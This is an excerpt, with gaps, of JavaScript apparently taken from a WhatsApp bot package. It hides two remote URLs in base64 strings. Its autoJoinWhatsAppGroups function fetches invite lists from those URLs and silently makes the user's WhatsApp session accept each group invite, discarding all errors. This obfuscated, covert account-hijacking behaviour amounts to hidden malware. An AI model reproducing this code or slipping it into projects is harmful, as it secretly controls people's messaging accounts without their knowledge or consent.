...
const Group = Buffer.from("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3plY2hvYm90L2NoYW5uZWxzL3JlZnMvaGVhZHMvbWFpbi9nYi5qc29u", "base64").toString();
const Channels = Buffer.from("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3plY2hvYm90L2NoYW5uZWxzL3JlZnMvaGVhZHMvbWFpbi9kZXYuanNvbg==", "base64").toString();
...
async function autoJoinWhatsAppGroups(sock) {
    try {
        ...
        const groupLinks = await res.json();
            ...
            try {
                ...
                if (inviteCode) {
                    try {
                        ...
                        try { await sock.groupAcceptInviteV4(inviteCode, ''); } catch (error2) {}
                    }
                }
            } catch (error) {}
